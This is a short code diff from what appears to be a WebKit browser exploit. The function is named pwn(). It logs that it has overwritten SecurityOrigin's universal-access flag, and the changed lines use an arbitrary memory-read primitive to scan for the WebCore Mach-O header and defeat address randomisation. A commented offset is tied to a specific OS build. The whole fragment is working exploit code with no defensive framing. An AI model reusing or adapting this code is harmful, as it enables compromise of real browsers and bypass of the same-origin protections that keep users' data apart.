@@ -401,17 +401,16 @@ function pwn() {
     log(`[*] Modified SecurityOrigin->m_universalAccess @ ${SecurityOrigin_flags2.toString(16)}`);
 
 
-    var webcore_base = vtab_addr - 0x2b00000 - (vtab_addr % 0x100); //0x2c00000 is too slow
-	for (var i=0; webcore_base + i < vtab_addr; i += 0x10) {
-		if (read64(webcore_base + i) == 0x100000cfeedfad0) {
-			log(`[*] webcore base @ ${(webcore_base + i).toString(16)}`);
-			webcore_base += i;
-			break;
-		}
-		if ((webcore_base + i) % 0x80 == 0) {
-			millis(1);
-		}
-	}
+    //var webcore_base = vtab_addr - 0x298e9c4; // d20 16.1
+    var webcore_base = vtab_addr - 0x2c00000 - (vtab_addr % 0x1000);
+    for (var i=0; webcore_base + i < vtab_addr; i += 0x1000) {
+        log(`[*] ${(webcore_base + i).toString(16)} @ ${read64(webcore_base + i).toString(16)}`);
+        if (read64(webcore_base + i) == 0x0100000cfeedfad0) {
+            log(`[*] webcore base @ ${(webcore_base + i).toString(16)}`);
+            webcore_base += i;
+            break;
+        }
+    }
 
     var read_webcore = read64(webcore_base);
     log(`[*] webcore read test @ ${read_webcore.toString(16)}`);
